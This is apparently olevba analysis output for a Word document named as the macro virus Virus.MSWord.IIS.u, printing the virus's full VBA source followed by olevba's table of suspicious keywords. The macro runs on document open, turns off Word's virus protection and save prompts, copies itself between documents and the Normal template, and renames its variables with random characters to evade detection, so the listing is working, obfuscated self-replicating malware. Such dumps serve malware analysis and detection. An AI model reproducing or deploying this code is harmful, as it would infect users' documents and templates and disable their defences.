olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.u-4d8d06adaf53e445734f444a5acc847da33ede25
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.u-4d8d06adaf53e445734f444a5acc847da33ede25 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
•—ÍßÆËõ“¶‘À—£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ÿ�¥ŽÂÃË� = "‘ÐçŽ’–í£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ü"
•—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂÆ¨åÚ¥Ã¢Ôºœï  = "´˜Ä¶ŸÂõ§ö¢ïç"
¿§ÀÂÇéÒ– = ActiveDocument.VBProject.VBComponents(1).CodeModule.countoflines
 Ï¾˜ŒÔ¦º = NormalTemplate.VBProject.VBComponents(1).CodeModule.countoflines
Application.Options.VirusProtection = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.SaveNormalPrompt = False
If ¿§ÀÂÇéÒ– > 169 And  Ï¾˜ŒÔ¦º > 169 Then Exit Sub
If  Ï¾˜ŒÔ¦º > 169 Then
Set Ã£«ÀÌ×¸„Êß = ActiveDocument
Set ÀÍ‹ÖÏë‘û�“©ô¡ô�¥ = NormalTemplate
GoTo •£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ê¨Ä ÖÌÓÙ£¡µˆ­ÁÀÒé§’ë ±å
End If
If  Ï¾˜ŒÔ¦º < 170 Then
Set Ã£«ÀÌ×¸„Êß = NormalTemplate
Set ÀÍ‹ÖÏë‘û�“©ô¡ô�¥ = ActiveDocument
End If
ReDim ³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—(50, 50)
´��¾¥« = ÀÍ‹ÖÏë‘û�“©ô¡ô�¥.VBProject.VBComponents(1).CodeModule.countoflines
¿§ÀÂÇéÒ– = 0
Do Until ¿§ÀÂÇéÒ– = ´��¾¥«
¿§ÀÂÇéÒ– = ¿§ÀÂÇéÒ– + 1
âë³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—›®œÝ«‹†¯Ë”�Þ = ÀÍ‹ÖÏë‘û�“©ô¡ô�¥.VBProject.VBComponents(1).CodeModule.Lines(¿§ÀÂÇéÒ–, 1)
If Left(âë³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—›®œÝ«‹†¯Ë”�Þ, 1) = "'" Then
›åžÚÏî­ºžÕÞ¢¹Äžß = Len(âë³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—›®œÝ«‹†¯Ë”�Þ)
âë³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—›®œÝ«‹†¯Ë”�Þ = Mid(âë³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—›®œÝ«‹†¯Ë”�Þ, 2, ›åžÚÏî­ºžÕÞ¢¹Äžß)
ïˆ = ""
èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ = Len(âë³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—›®œÝ«‹†¯Ë”�Þ)
Randomize Timer
Ò–èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ¡ÑµÎ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’ÐØ�‡£®×ÂŽ½É×¡´²:
•—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ = CInt(Rnd * 30) + 1
For �„ú = 1 To •—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ
' Ï¾˜ŒÔ¦º
'Ã£«ÀÌ×¸„Êß
'ÀÍ‹ÖÏë‘û�“©ô¡ô�¥
'£½ä¦£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ñ
'ƒÒïˆ‚æ
'Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À
'ÒÐàÀúÏôÆû‡Í›ÐÊ¹£ÞÍ›¯ù
'¿§ÀÂÇéÒ–
'£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’
'¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯
'¹§òÎ”¶£ß±³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—’ÚÀÇûÄÊ
'›åžÚÏî­ºžÕÞ¢¹Äžß
'°³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—ÒÕ›»¥�»Úñ»ç¹¹†Ü
'ÁË¦çÌ¸¬Êùõà²§
'õÁÇ²�é³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—Ó«Ìó³½òÍØ˜ô›Õ
'Ò–èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ¡ÑµÎ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’ÐØ�‡£®×ÂŽ½É×¡´²
'¯ ûÅèÀ¹ÂÕÏçª¶êí¦²úÅÂò×œ 
' Ø˜Òí�ÌóÔÀ¢äÓˆ
'Ü¿£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ï‘Ô´˜ð
'èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ
'âë³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—›®œÝ«‹†¯Ë”�Þ
'Æî¨µŒ ƒ¥Ï§ÚÊ®ÆùÊ­”ôÄá™°ÄñÄ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’
'×†òçŽ±éç¾´·³ŸËä¹õ¿Ð‹�ˆ°¹£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Û
'�„ú
'Ü¿£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ï‘Ô´˜ð
'›åžÚÏî­ºžÕÞ¢¹Äžß
'£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’
'èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ
'Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À
'´��¾¥«
'ïˆ
'�„ú
'¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯
' Ø˜Òí�ÌóÔÀ¢äÓˆ
'³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—
'èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ
'ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�
'õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’
'ïˆ
'�„ú
'•—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ
'�„ú
'³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—
'èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ
'¿§ÀÂÇéÒ–
'�„ú
'ïˆ
'•£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ê¨Ä ÖÌÓÙ£¡µˆ­ÁÀÒé§’ë ±å
'•—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ
õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’:
ïˆ = CInt(Rnd * 250) + 1
If ïˆ = 13 Then GoTo õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’
If ïˆ < 65 Then GoTo õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’
If ïˆ < 130 Then GoTo õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’
ïˆ = ïˆ & Chr(ïˆ)
Next �„ú
ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»� = ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»� + 1
³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�, 1) = âë³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—›®œÝ«‹†¯Ë”�Þ
³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�, 2) = ïˆ
End If
Loop
•£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ê¨Ä ÖÌÓÙ£¡µˆ­ÁÀÒé§’ë ±å:
¿§ÀÂÇéÒ– = 1
èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ = "Private Sub Document_Open()" & Chr(13)
If  Ï¾˜ŒÔ¦º < 170 Then
•—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ = CInt(Rnd * 30) + 1
For �„ú = 1 To •—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ
 Ø˜Òí�ÌóÔÀ¢äÓˆ:
Ü¿£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ï‘Ô´˜ð = CInt(Rnd * 250)
If Ü¿£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ï‘Ô´˜ð = 13 Then GoTo  Ø˜Òí�ÌóÔÀ¢äÓˆ
If Ü¿£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ï‘Ô´˜ð < 65 Then GoTo  Ø˜Òí�ÌóÔÀ¢äÓˆ
If Ü¿£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ï‘Ô´˜ð < 130 Then GoTo  Ø˜Òí�ÌóÔÀ¢äÓˆ
ïˆ = ïˆ & Chr(Ü¿£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ï‘Ô´˜ð)
Next �„ú
•—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ = CInt(Rnd * 20)
For �„ú = 1 To •—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ
³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—:
Ü¿£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ï‘Ô´˜ð = CInt(Rnd * 250)
If Ü¿£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ï‘Ô´˜ð = 13 Then GoTo ³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—
If Ü¿£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ï‘Ô´˜ð = 34 Then GoTo ³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—
If Ü¿£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ï‘Ô´˜ð < 130 Then GoTo ³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—
�„ú = �„ú & Chr(Ü¿£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Ï‘Ô´˜ð)
Next �„ú
èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ = èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ & ïˆ & "=" & Chr(34) & �„ú & Chr(34) & Chr(13)
End If
›åžÚÏî­ºžÕÞ¢¹Äžß = ÀÍ‹ÖÏë‘û�“©ô¡ô�¥.VBProject.VBComponents(1).CodeModule.countoflines
For £ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’ = 2 To ›åžÚÏî­ºžÕÞ¢¹Äžß
èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ = èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ & ÀÍ‹ÖÏë‘û�“©ô¡ô�¥.VBProject.VBComponents(1).CodeModule.Lines(£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’, 1) & Chr(13)
Next £ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’
If  Ï¾˜ŒÔ¦º > 169 Then GoTo •—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ
Do
Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À = 0
´��¾¥« = Len(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ)
èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ = èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ + 1
If ³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, 1) = "" Then GoTo •—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ
èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ = Len(³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, 1))
•—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ = ³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, 1)
Do Until Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À = ´��¾¥«
´��¾¥« = Len(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ)
Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À = Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À + 1
ïˆ = Mid(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À, èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ)
If UCase(ïˆ) = UCase(•—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ) Then
If Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À = 1 Then
ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»� = Mid(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À + èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, 1)
¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 0
If Asc(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�) < 65 Then ¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 1
If Asc(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�) > 90 And Asc(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�) < 97 Then ¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 1
If Asc(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�) > 122 Then ¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 1
If ¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 1 Then
èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ = èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ & ³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, 2) & Mid(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À + èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, ´��¾¥«)
End If
Else
¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 0
ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»� = Mid(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À - 1, 1)
If Asc(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�) < 65 Then ¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 1
If Asc(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�) > 90 And Asc(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�) < 97 Then ¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 1
If Asc(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�) > 122 Then ¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 1
If ¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 1 Then
ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»� = Mid(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À + èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, 1)
¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 0
If Asc(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�) < 65 Then ¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 1
If Asc(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�) > 90 And Asc(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�) < 97 Then ¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 1
If Asc(ª£¨§©ôä«£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’Êøæû±™ð×ïÉŒû£»�) > 122 Then ¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 1
If ¼²³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—©�úÑÕÀ¹ë³ÜÎ¬‡‘Ùç¶Åè”ù¯ = 1 Then
èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ = Mid(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, 1, Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À - 1)
èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ = èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ & ³Õ«ÜÝ«Í˜¼—âê¡ …õ®À�Á“�«Ô©¬Ú—(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, 2) & Mid(èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, Ì’·ª�ÙÅ¯ó¨ˆ¹¨¸î£ÄÎÔ£ ¤Ù ÷››Þ‘ó°ó�ÐôÓÜ‰ˆ¼óâÜËïºº’öÉÂô°Ž À + èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ, ´��¾¥«)
èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ = èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ
End If
End If
End If
End If
Loop
Loop
•—ÍßÆËõ“¶‘À—ŠŸ�¥ŽÂ:
´��¾¥« = Ã£«ÀÌ×¸„Êß.VBProject.VBComponents(1).CodeModule.countoflines
Ã£«ÀÌ×¸„Êß.VBProject.VBComponents(1).CodeModule.deletelines 1, ´��¾¥«
Ã£«ÀÌ×¸„Êß.VBProject.VBComponents(1).CodeModule.AddFromstring (èúÝª·¹ß²„¨å¾·ô”é½ž„òÖ£¬“�‘…µƒœ)
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

